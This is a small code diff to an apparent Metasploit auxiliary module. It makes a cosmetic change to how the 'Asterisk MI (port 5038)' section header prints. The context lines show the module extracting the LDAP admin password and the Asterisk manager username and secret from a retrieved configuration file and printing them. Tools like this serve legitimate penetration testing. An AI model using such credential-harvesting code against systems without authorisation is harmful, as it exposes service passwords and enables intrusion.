@@ -83,9 +83,8 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Username: ' + 'cn=admin,dc=localdomain')
     print_good('Password: ' + config.first[/ldappassword\',\'(.*?)\'/, 1] + "\n")
 
-    asterisk_header = 'Asterisk MI (port 5038)'
-    print_status(asterisk_header)
-    print_status('-' * asterisk_header.length)
+    print_status('Asterisk MI (port 5038)')
+    print_status('-----------------------')
     print_good('Username: ' + config.first[/manageruser\',\'(.*?)\'/, 1])
     print_good('Password: ' + config.first[/managersecret\',\'(.*?)\'/, 1] + "\n")
 
